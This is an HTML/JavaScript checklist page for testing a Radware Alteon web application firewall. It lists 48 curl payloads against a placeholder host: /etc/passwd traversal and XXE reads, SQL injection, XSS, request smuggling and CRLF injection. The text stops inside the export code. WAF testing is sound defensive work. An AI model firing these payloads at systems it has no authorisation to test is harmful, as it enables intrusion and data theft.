<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radware Alteon WAF Testing Tool - Professional Edition</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: #2c3e50;
            color: white;
            padding: 30px 0;
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #ecf0f1;
            font-size: 14px;
        }
        
        .header-stats {
            display: flex;
            gap: 30px;
            margin-top: 20px;
        }
        
        .header-stat {
            background: rgba(255,255,255,0.1);
            padding: 10px 20px;
            border-radius: 4px;
        }
        
        .header-stat h3 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .header-stat p {
            font-size: 12px;
            opacity: 0.8;
        }
        
        .controls {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .search-box {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 15px;
        }
        
        .filters {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            align-items: center;
        }
        
        .filter-btn {
            padding: 8px 16px;
            border: 1px solid #ddd;
            background: white;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .filter-btn.active {
            background: #3498db;
            color: white;
            border-color: #3498db;
        }
        
        .export-section {
            margin-left: auto;
            display: flex;
            gap: 10px;
        }
        
        .export-btn {
            background: #27ae60;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .export-btn:hover {
            background: #229954;
        }
        
        .reset-btn {
            background: #e74c3c;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .reset-btn:hover {
            background: #c0392b;
        }
        
        .test-category {
            background: white;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .category-header {
            background: #34495e;
            color: white;
            padding: 15px 20px;
            font-size: 18px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .category-stats {
            font-size: 14px;
            font-weight: normal;
        }
        
        .test-item {
            border-bottom: 1px solid #eee;
            padding: 20px;
        }
        
        .test-item:last-child {
            border-bottom: none;
        }
        
        .test-item.passed {
            background: #e8f8f5;
        }
        
        .test-item.failed {
            background: #fadbd8;
        }
        
        .test-item.skipped {
            background: #fef9e7;
        }
        
        .test-header {
            display: flex;
            justify-content: space-between;
            align-items: start;
            margin-bottom: 15px;
        }
        
        .test-info h3 {
            font-size: 16px;
            margin-bottom: 5px;
        }
        
        .test-info p {
            color: #666;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .badges {
            display: flex;
            gap: 8px;
        }
        
        .badge {
            padding: 4px 12px;
            border-radius: 3px;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .severity-critical { background: #e74c3c; color: white; }
        .severity-high { background: #e67e22; color: white; }
        .severity-medium { background: #f39c12; color: white; }
        .severity-low { background: #27ae60; color: white; }
        
        .test-id {
            background: #95a5a6;
            color: white;
        }
        
        .status-passed { background: #27ae60; color: white; }
        .status-failed { background: #e74c3c; color: white; }
        .status-skipped { background: #f39c12; color: white; }
        
        .test-actions {
            display: flex;
            gap: 10px;
        }
        
        .action-btn {
            padding: 6px 12px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            border: none;
            transition: all 0.2s;
        }
        
        .pass-btn {
            background: #27ae60;
            color: white;
        }
        
        .pass-btn:hover {
            background: #229954;
        }
        
        .fail-btn {
            background: #e74c3c;
            color: white;
        }
        
        .fail-btn:hover {
            background: #c0392b;
        }
        
        .skip-btn {
            background: #f39c12;
            color: white;
        }
        
        .skip-btn:hover {
            background: #d68910;
        }
        
        .clear-btn {
            background: #95a5a6;
            color: white;
        }
        
        .clear-btn:hover {
            background: #7f8c8d;
        }
        
        .curl-section {
            background: #1e1e1e;
            border-radius: 4px;
            padding: 15px;
            margin-top: 10px;
            position: relative;
        }
        
        .curl-label {
            color: #999;
            font-size: 12px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .copy-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .copy-btn:hover {
            background: #2980b9;
        }
        
        .curl-command {
            color: #4fc08d;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 13px;
            word-break: break-all;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        
        .notes-section {
            margin-top: 10px;
        }
        
        .notes-label {
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 5px;
            color: #666;
        }
        
        .notes-input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            resize: vertical;
            min-height: 60px;
            font-family: inherit;
        }
        
        .stats {
            background: white;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            text-align: center;
        }
        
        .stat-item h4 {
            font-size: 32px;
            margin-bottom: 5px;
        }
        
        .stat-item p {
            color: #666;
            font-size: 14px;
        }
        
        .stat-total { color: #3498db; }
        .stat-passed { color: #27ae60; }
        .stat-failed { color: #e74c3c; }
        .stat-skipped { color: #f39c12; }
        .stat-pending { color: #95a5a6; }
        
        .progress-bar {
            background: #ecf0f1;
            height: 30px;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 20px;
            position: relative;
        }
        
        .progress-segment {
            height: 100%;
            float: left;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 12px;
            font-weight: bold;
        }
        
        .progress-passed { background: #27ae60; }
        .progress-failed { background: #e74c3c; }
        .progress-skipped { background: #f39c12; }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #2ecc71;
            color: white;
            padding: 15px 20px;
            border-radius: 4px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: white;
            padding: 30px;
            border-radius: 8px;
            max-width: 500px;
            width: 90%;
        }
        
        .modal h2 {
            margin-bottom: 20px;
        }
        
        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
            margin-top: 20px;
        }
        
        .btn-confirm {
            background: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .btn-cancel {
            background: #95a5a6;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>Radware Alteon WAF Testing Tool - Professional Edition</h1>
            <p class="subtitle">Comprehensive WAF Security Assessment with Results Tracking</p>
            <div class="header-stats">
                <div class="header-stat">
                    <h3 id="header-total">48</h3>
                    <p>Total Tests</p>
                </div>
                <div class="header-stat">
                    <h3 id="header-completed">0</h3>
                    <p>Completed</p>
                </div>
                <div class="header-stat">
                    <h3 id="header-progress">0%</h3>
                    <p>Progress</p>
                </div>
            </div>
        </div>
    </header>

    <div class="container">
        <div class="stats">
            <div class="stat-item">
                <h4 class="stat-total" id="stat-total">48</h4>
                <p>Total Tests</p>
            </div>
            <div class="stat-item">
                <h4 class="stat-passed" id="stat-passed">0</h4>
                <p>Passed</p>
            </div>
            <div class="stat-item">
                <h4 class="stat-failed" id="stat-failed">0</h4>
                <p>Failed</p>
            </div>
            <div class="stat-item">
                <h4 class="stat-skipped" id="stat-skipped">0</h4>
                <p>Skipped</p>
            </div>
            <div class="stat-item">
                <h4 class="stat-pending" id="stat-pending">48</h4>
                <p>Pending</p>
            </div>
        </div>

        <div class="progress-bar" id="progress-bar">
            <div class="progress-segment progress-passed" id="progress-passed" style="width: 0%"></div>
            <div class="progress-segment progress-failed" id="progress-failed" style="width: 0%"></div>
            <div class="progress-segment progress-skipped" id="progress-skipped" style="width: 0%"></div>
        </div>

        <div class="controls">
            <input type="text" class="search-box" id="search" placeholder="Search tests by name, ID, or description...">
            <div class="filters">
                <button class="filter-btn active" onclick="filterBySeverity('all')">All Tests</button>
                <button class="filter-btn" onclick="filterBySeverity('critical')">Critical</button>
                <button class="filter-btn" onclick="filterBySeverity('high')">High</button>
                <button class="filter-btn" onclick="filterBySeverity('medium')">Medium</button>
                <button class="filter-btn" onclick="filterBySeverity('low')">Low</button>
                <div class="export-section">
                    <button class="export-btn" onclick="exportToExcel()">📊 Export Excel Report</button>
                    <button class="export-btn" onclick="exportToText()">📄 Export Text</button>
                    <button class="reset-btn" onclick="showResetModal()">🔄 Reset All</button>
                </div>
            </div>
        </div>

        <div id="test-container">
            <!-- Tests will be dynamically inserted here -->
        </div>
    </div>

    <div class="notification" id="notification">Copied to clipboard!</div>
    
    <div class="modal" id="reset-modal">
        <div class="modal-content">
            <h2>Reset All Test Results?</h2>
            <p>This will clear all test results and notes. This action cannot be undone.</p>
            <div class="modal-buttons">
                <button class="btn-cancel" onclick="hideResetModal()">Cancel</button>
                <button class="btn-confirm" onclick="resetAllResults()">Reset All</button>
            </div>
        </div>
    </div>

    <script>
        // Test data
        const tests = {
            'UTF8/Unicode Parsing': [
                {
                    id: 'RADWARE-001',
                    name: 'UTF8 Parse Failure in Reply Start Line',
                    severity: 'medium',
                    description: 'Tests if WAF handles UTF8 parsing errors in HTTP response start line',
                    curl: 'curl -X GET "http://TARGET_HOST/test" -H "X-Invalid-UTF8: $(printf \'\\xC3\\x28\')" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-002',
                    name: 'Unicode Parse Failure in Reply Start Line',
                    severity: 'medium',
                    description: 'Tests Unicode parsing error handling in HTTP response start line',
                    curl: 'curl -X GET "http://TARGET_HOST/test" -H "X-Invalid-Unicode: $(printf \'\\xED\\xA0\\x80\')" -H "Accept: */*" -v'
                },
                {
                    id: 'RADWARE-003',
                    name: 'UTF8 Parse Failure in URI Path',
                    severity: 'high',
                    description: 'Tests UTF8 parsing failures in URI path parameters',
                    curl: 'curl -X GET "http://TARGET_HOST/path$(printf \'\\xC3\\x28\')test" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-004',
                    name: 'UTF8 Parse Failure in Parameter Name',
                    severity: 'high',
                    description: 'Tests UTF8 parsing errors in URL parameter names',
                    curl: 'curl -X GET "http://TARGET_HOST/?param$(printf \'\\xC3\\x28\')=value" -H "Accept: text/html" -v'
                },
                {
                    id: 'RADWARE-005',
                    name: 'Unicode Parse Failure in Parameter Name',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URL parameter names',
                    curl: 'curl -X GET "http://TARGET_HOST/?param$(printf \'\\xED\\xA0\\x80\')=value" -H "Host: example.com" -v'
                },
                {
                    id: 'RADWARE-006',
                    name: 'UTF8 Parse Failure in Parameter Value',
                    severity: 'high',
                    description: 'Tests UTF8 parsing errors in URL parameter values',
                    curl: 'curl -X GET "http://TARGET_HOST/?param=value$(printf \'\\xC3\\x28\')" -H "User-Agent: TestAgent" -v'
                },
                {
                    id: 'RADWARE-007',
                    name: 'Unicode Parse Failure in Parameter Value',
                    severity: 'high',
                    description: 'Tests Unicode parsing failures in URL parameter values',
                    curl: 'curl -X GET "http://TARGET_HOST/?param=value$(printf \'\\xED\\xA0\\x80\')" -H "Accept-Language: en" -v'
                }
            ],
            'JSON Handling': [
                {
                    id: 'RADWARE-008',
                    name: 'Disable JSON Parsing',
                    severity: 'high',
                    description: 'Tests if JSON parsing can be bypassed or disabled',
                    curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"test":"<script>alert(1)</ script>"}\' -v'
                },
                {
                    id: 'RADWARE-009',
                    name: 'JavaScript Content-Type',
                    severity: 'high',
                    description: 'Tests JSON parsing with JavaScript content type',
                    curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/javascript" -d \'alert(document.cookie)\' -v'
                },
                {
                    id: 'RADWARE-010',
                    name: 'JSON with Extra Curly Brackets',
                    severity: 'medium',
                    description: 'Tests JSON parsing with additional curly brackets',
                    curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"key": "value"}}\' -v'
                },
                {
                    id: 'RADWARE-011',
                    name: 'JSON Parameter Pollution',
                    severity: 'medium',
                    description: 'Tests JSON with duplicate parameter names',
                    curl: 'curl -X POST "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"user":"admin","user":"attacker"}\' -v'
                }
            ],
            'HTTP Headers': [
                {
                    id: 'RADWARE-012',
                    name: 'Low ASCII in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with low ASCII characters (0-31)',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "$(printf \'X-Test\\x01: value\')" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-013',
                    name: 'High ASCII in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with high ASCII characters (128+)',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "$(printf \'X-Test\\x80: value\')" -H "Accept: */*" -v'
                },
                {
                    id: 'RADWARE-014',
                    name: 'Separator Characters in Header Name',
                    severity: 'medium',
                    description: 'Tests header names with separator characters',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "X-Test;Inject: value" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-015',
                    name: 'Missing Host Header',
                    severity: 'high',
                    description: 'Tests requests without required Host header',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "Host:" --http1.0 -v'
                },
                {
                    id: 'RADWARE-016',
                    name: 'Range Header Attack',
                    severity: 'medium',
                    description: 'Tests multiple range headers for DoS potential',
                    curl: 'curl -X GET "http://TARGET_HOST/large-file" -H "Range: bytes=0-10,20-30,40-50,60-70,80-90" -v'
                }
            ],
            'Parameter Handling': [
                {
                    id: 'RADWARE-017',
                    name: 'Empty Parameter Name',
                    severity: 'medium',
                    description: 'Tests URL parameters without names',
                    curl: 'curl -X GET "http://TARGET_HOST/?=value&test=data" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-018',
                    name: 'Low ASCII in Parameter Name',
                    severity: 'medium',
                    description: 'Tests parameter names with control characters',
                    curl: 'curl -X GET "http://TARGET_HOST/?$(printf \'param\\x01\')=value" -H "Accept: text/html" -v'
                },
                {
                    id: 'RADWARE-019',
                    name: 'Parameter Pollution Attack',
                    severity: 'high',
                    description: 'Tests multiple parameters with same name',
                    curl: 'curl -X GET "http://TARGET_HOST/?user=admin&user=attacker" -H "Cookie: session=valid" -v'
                },
                {
                    id: 'RADWARE-020',
                    name: 'Parameter Without Equal Sign',
                    severity: 'low',
                    description: 'Tests parameters without equal sign assignment',
                    curl: 'curl -X GET "http://TARGET_HOST/?flag&test=value" -H "Accept: */*" -v'
                }
            ],
            'URI Validation': [
                {
                    id: 'RADWARE-021',
                    name: 'URL-Encoded Reserved Characters',
                    severity: 'medium',
                    description: 'Tests URL encoding of reserved characters',
                    curl: 'curl -X GET "http://TARGET_HOST/path%2F..%2F..%2Fetc%2Fpasswd" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-022',
                    name: 'Spaces in URI',
                    severity: 'medium',
                    description: 'Tests URI containing space characters',
                    curl: 'curl -X GET "http://TARGET_HOST/path%20with%20spaces" -H "Accept: text/html" -v'
                },
                {
                    id: 'RADWARE-023',
                    name: 'Low ASCII in URI',
                    severity: 'high',
                    description: 'Tests URI with non-printable ASCII characters',
                    curl: 'curl -X GET "http://TARGET_HOST/file%00.txt" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-024',
                    name: 'High ASCII in URI',
                    severity: 'high',
                    description: 'Tests URI with high ASCII characters',
                    curl: 'curl -X GET "http://TARGET_HOST/%80%81%82%FF" -H "Accept: */*" -v'
                },
                {
                    id: 'RADWARE-025',
                    name: 'Backslash Encoding Test',
                    severity: 'medium',
                    description: 'Tests %5C (backslash) encoding in URI',
                    curl: 'curl -X GET "http://TARGET_HOST/%5C..%5C..%5Cwindows%5Csystem32" -H "User-Agent: Mozilla/5.0" -v'
                }
            ],
            'Multipart/File Upload': [
                {
                    id: 'RADWARE-026',
                    name: 'Large File Upload Test',
                    severity: 'high',
                    description: 'Tests large file upload handling',
                    curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@/dev/zero;filename=large.bin" --limit-rate 100k --max-time 30 -v'
                },
                {
                    id: 'RADWARE-027',
                    name: 'Double Content-Disposition',
                    severity: 'medium',
                    description: 'Tests multiple Content-Disposition headers',
                    curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" -d $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\nContent-Disposition: form-data; name="evil"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                },
                {
                    id: 'RADWARE-028',
                    name: 'Multipart without CRLF',
                    severity: 'low',
                    description: 'Tests multipart data without proper line endings',
                    curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" -d $\'------Test\\nContent-Disposition: form-data; name="file"\\n\\ndata\\n------Test--\' -v'
                },
                {
                    id: 'RADWARE-029',
                    name: 'GET Request with Body',
                    severity: 'medium',
                    description: 'Tests GET request containing body data',
                    curl: 'curl -X GET "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"unexpected":"body"}\' -v'
                }
            ],
            'Advanced Tests': [
                {
                    id: 'RADWARE-030',
                    name: 'HTTP Request Smuggling CL.TE',
                    severity: 'critical',
                    description: 'Tests Content-Length and Transfer-Encoding smuggling',
                    curl: 'curl -X POST "http://TARGET_HOST/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $\'1\\r\\nZ\\r\\n0\\r\\n\\r\\n\' -v'
                },
                {
                    id: 'RADWARE-031',
                    name: 'HTTP Request Smuggling TE.CL',
                    severity: 'critical',
                    description: 'Tests Transfer-Encoding and Content-Length smuggling',
                    curl: 'curl -X POST "http://TARGET_HOST/" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" -d $\'0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\' -v'
                },
                {
                    id: 'RADWARE-032',
                    name: 'Multiple Host Headers',
                    severity: 'high',
                    description: 'Tests multiple Host headers for host header injection',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "Host: legitimate.com" -H "Host: evil.com" -v'
                },
                {
                    id: 'RADWARE-033',
                    name: 'HTTP Method Override',
                    severity: 'medium',
                    description: 'Tests HTTP method override headers',
                    curl: 'curl -X POST "http://TARGET_HOST/api/users/1" -H "X-HTTP-Method-Override: DELETE" -H "Content-Type: application/json" -d \'{}\' -v'
                },
                {
                    id: 'RADWARE-034',
                    name: 'Null Byte in Cookie',
                    severity: 'high',
                    description: 'Tests null byte injection in cookies',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "Cookie: session=valid%00admin=true" -v'
                },
                {
                    id: 'RADWARE-035',
                    name: 'CRLF Injection in Header',
                    severity: 'high',
                    description: 'Tests CRLF injection in headers',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H $\'X-Test: value\\r\\nX-Injected: malicious\' -v'
                },
                {
                    id: 'RADWARE-036',
                    name: 'Chunked Encoding Size Overflow',
                    severity: 'medium',
                    description: 'Tests chunked encoding with oversized chunk values',
                    curl: 'curl -X POST "http://TARGET_HOST/" -H "Transfer-Encoding: chunked" -d $\'FFFFFFFFFF\\r\\ndata\\r\\n0\\r\\n\\r\\n\' -v'
                },
                {
                    id: 'RADWARE-037',
                    name: 'Invalid HTTP Method',
                    severity: 'low',
                    description: 'Tests handling of invalid HTTP methods',
                    curl: 'curl -X INVALID "http://TARGET_HOST/" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-038',
                    name: 'Overlong Header Values',
                    severity: 'medium',
                    description: 'Tests extremely long header values',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "X-Long: $(python3 -c \'print("A"*8000)\')" -v'
                },
                {
                    id: 'RADWARE-039',
                    name: 'Tab Character in URI',
                    severity: 'medium',
                    description: 'Tests tab characters in URI path',
                    curl: 'curl -X GET "http://TARGET_HOST/path%09test" -H "Accept: */*" -v'
                },
                {
                    id: 'RADWARE-040',
                    name: 'CR Character in URI',
                    severity: 'high',
                    description: 'Tests carriage return in URI for response splitting',
                    curl: 'curl -X GET "http://TARGET_HOST/path%0Dtest" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-041',
                    name: 'LF Character in URI',
                    severity: 'high',
                    description: 'Tests line feed in URI for header injection',
                    curl: 'curl -X GET "http://TARGET_HOST/path%0Atest" -H "Accept: text/html" -v'
                },
                {
                    id: 'RADWARE-042',
                    name: 'Mixed Case HTTP Method',
                    severity: 'low',
                    description: 'Tests mixed case HTTP methods',
                    curl: 'curl -X "gEt" "http://TARGET_HOST/" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-043',
                    name: 'Space in HTTP Method',
                    severity: 'medium',
                    description: 'Tests space character in HTTP method',
                    curl: 'curl --request "GET " "http://TARGET_HOST/" -H "Host: example.com" -v'
                },
                {
                    id: 'RADWARE-044',
                    name: 'Unicode Normalization Bypass',
                    severity: 'high',
                    description: 'Tests Unicode normalization vulnerabilities',
                    curl: 'curl -X GET "http://TARGET_HOST/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd" -H "Accept: */*" -v'
                },
                {
                    id: 'RADWARE-045',
                    name: 'Double URL Encoding',
                    severity: 'medium',
                    description: 'Tests double URL encoding bypass',
                    curl: 'curl -X GET "http://TARGET_HOST/?q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E" -H "User-Agent: Mozilla/5.0" -v'
                },
                {
                    id: 'RADWARE-046',
                    name: 'SQL Injection in JSON',
                    severity: 'critical',
                    description: 'Tests SQL injection within JSON payload',
                    curl: 'curl -X POST "http://TARGET_HOST/api/user" -H "Content-Type: application/json" -d \'{"id":"1\' OR \'1\'=\'1"}\' -v'
                },
                {
                    id: 'RADWARE-047',
                    name: 'XXE in XML Request',
                    severity: 'critical',
                    description: 'Tests XML External Entity injection',
                    curl: 'curl -X POST "http://TARGET_HOST/xml" -H "Content-Type: application/xml" -d \'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>\' -v'
                },
                {
                    id: 'RADWARE-048',
                    name: 'WebSocket Upgrade Bypass',
                    severity: 'medium',
                    description: 'Tests WAF bypass using WebSocket upgrade',
                    curl: 'curl -X GET "http://TARGET_HOST/" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==" -H "Sec-WebSocket-Version: 13" -v'
                }
            ]
        };

        // Load saved results from localStorage
        let testResults = JSON.parse(localStorage.getItem('wafTestResults')) || {};
        let currentFilter = 'all';
        let searchTerm = '';

        // Initialize
        function init() {
            updateStats();
            renderTests();
        }

        // Update statistics
        function updateStats() {
            const allTests = Object.values(tests).flat();
            const stats = {
                total: allTests.length,
                passed: 0,
                failed: 0,
                skipped: 0,
                pending: 0
            };

            allTests.forEach(test => {
                const result = testResults[test.id];
                if (result) {
                    stats[result.status]++;
                } else {
                    stats.pending++;
                }
            });

            // Update stat numbers
            document.getElementById('stat-total').textContent = stats.total;
            document.getElementById('stat-passed').textContent = stats.passed;
            document.getElementById('stat-failed').textContent = stats.failed;
            document.getElementById('stat-skipped').textContent = stats.skipped;
            document.getElementById('stat-pending').textContent = stats.pending;

            // Update header stats
            const completed = stats.passed + stats.failed + stats.skipped;
            const progress = Math.round((completed / stats.total) * 100);
            document.getElementById('header-total').textContent = stats.total;
            document.getElementById('header-completed').textContent = completed;
            document.getElementById('header-progress').textContent = progress + '%';

            // Update progress bar
            const passedPercent = (stats.passed / stats.total) * 100;
            const failedPercent = (stats.failed / stats.total) * 100;
            const skippedPercent = (stats.skipped / stats.total) * 100;

            document.getElementById('progress-passed').style.width = passedPercent + '%';
            document.getElementById('progress-passed').textContent = stats.passed > 0 ? stats.passed : '';
            
            document.getElementById('progress-failed').style.width = failedPercent + '%';
            document.getElementById('progress-failed').textContent = stats.failed > 0 ? stats.failed : '';
            
            document.getElementById('progress-skipped').style.width = skippedPercent + '%';
            document.getElementById('progress-skipped').textContent = stats.skipped > 0 ? stats.skipped : '';
        }

        // Render tests
        function renderTests() {
            const container = document.getElementById('test-container');
            container.innerHTML = '';

            Object.entries(tests).forEach(([category, categoryTests]) => {
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'test-category';

                const visibleTests = categoryTests.filter(test => {
                    const matchesFilter = currentFilter === 'all' || test.severity === currentFilter;
                    const matchesSearch = searchTerm === '' || 
                        test.name.toLowerCase().includes(searchTerm) ||
                        test.id.toLowerCase().includes(searchTerm) ||
                        test.description.toLowerCase().includes(searchTerm);
                    return matchesFilter && matchesSearch;
                });

                if (visibleTests.length === 0) return;

                // Calculate category stats
                const categoryStats = {
                    passed: visibleTests.filter(t => testResults[t.id]?.status === 'passed').length,
                    failed: visibleTests.filter(t => testResults[t.id]?.status === 'failed').length,
                    skipped: visibleTests.filter(t => testResults[t.id]?.status === 'skipped').length
                };

                categoryDiv.innerHTML = `
                    <div class="category-header">
                        <span>${category}</span>
                        <span class="category-stats">
                            ✅ ${categoryStats.passed} | ❌ ${categoryStats.failed} | ⏭️ ${categoryStats.skipped} | Total: ${visibleTests.length}
                        </span>
                    </div>
                    ${visibleTests.map(test => renderTestItem(test)).join('')}
                `;

                container.appendChild(categoryDiv);
            });
        }

        // Render individual test item
        function renderTestItem(test) {
            const result = testResults[test.id];
            const status = result ? result.status : 'pending';
            const notes = result ? result.notes : '';

            return `
                <div class="test-item ${status}" data-test-id="${test.id}">
                    <div class="test-header">
                        <div class="test-info">
                            <h3>${test.name}</h3>
                            <p>${test.description}</p>
                            <div class="badges">
                                <span class="badge severity-${test.severity}">${test.severity}</span>
                                <span class="badge test-id">${test.id}</span>
                                ${status !== 'pending' ? `<span class="badge status-${status}">${status.toUpperCase()}</span>` : ''}
                            </div>
                        </div>
                        <div class="test-actions">
                            <button class="action-btn pass-btn" onclick="updateTestStatus('${test.id}', 'passed')">✅ Pass</button>
                            <button class="action-btn fail-btn" onclick="updateTestStatus('${test.id}', 'failed')">❌ Fail</button>
                            <button class="action-btn skip-btn" onclick="updateTestStatus('${test.id}', 'skipped')">⏭️ Skip</button>
                            <button class="action-btn clear-btn" onclick="updateTestStatus('${test.id}', null)">🔄 Clear</button>
                        </div>
                    </div>
                    <div class="curl-section">
                        <div class="curl-label">
                            <span>cURL Command:</span>
                            <button class="copy-btn" onclick="copyCommand('${test.id}')">📋 Copy</button>
                        </div>
                        <div class="curl-command">${test.curl}</div>
                    </div>
                    <div class="notes-section">
                        <div class="notes-label">Test Notes:</div>
                        <textarea class="notes-input" placeholder="Add notes about test results, response codes, WAF behavior..." 
                                  onchange="updateTestNotes('${test.id}', this.value)">${notes}</textarea>
                    </div>
                </div>
            `;
        }

        // Update test status
        function updateTestStatus(testId, status) {
            if (status === null) {
                delete testResults[testId];
            } else {
                if (!testResults[testId]) {
                    testResults[testId] = {};
                }
                testResults[testId].status = status;
                testResults[testId].timestamp = new Date().toISOString();
            }
            
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
            updateStats();
            renderTests();
        }

        // Update test notes
        function updateTestNotes(testId, notes) {
            if (!testResults[testId]) {
                testResults[testId] = {};
            }
            testResults[testId].notes = notes;
            localStorage.setItem('wafTestResults', JSON.stringify(testResults));
        }

        // Copy command
        function copyCommand(testId) {
            const test = Object.values(tests).flat().find(t => t.id === testId);
            navigator.clipboard.writeText(test.curl).then(() => {
                showNotification('Command copied to clipboard!');
            });
        }

        // Filter by severity
        function filterBySeverity(severity) {
            currentFilter = severity;
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            renderTests();
        }

        // Search functionality
        document.getElementById('search').addEventListener('input', (e) => {
            searchTerm = e.target.value.toLowerCase();
            renderTests();
        });

        // Export to Excel
        function exportToExcel() {
            const wb = XLSX.utils.book_new();
            
            // Summary sheet
            const summaryData = [
                ['Radware Alteon WAF Testing Report'],
                ['Generated:', new Date().toLocaleString()],
                [''],
                ['Test Summary'],
                ['Total Tests:', Object.values(tests).flat().length],
                ['Passed:', document.getElementById('stat-passed').textContent],
                ['Failed:', document.getElementById('stat-failed').textContent],
                ['Skipped:', document.getElementById('stat-skipped').textContent],
                ['Pending:', document.getElementById('stat-pending').textContent],
                [''],
                ['Progress:', document.getElementById('header-progress').textContent]
            ];
            
            const summaryWs = XLSX.utils.aoa_to_sheet(summaryData);
            
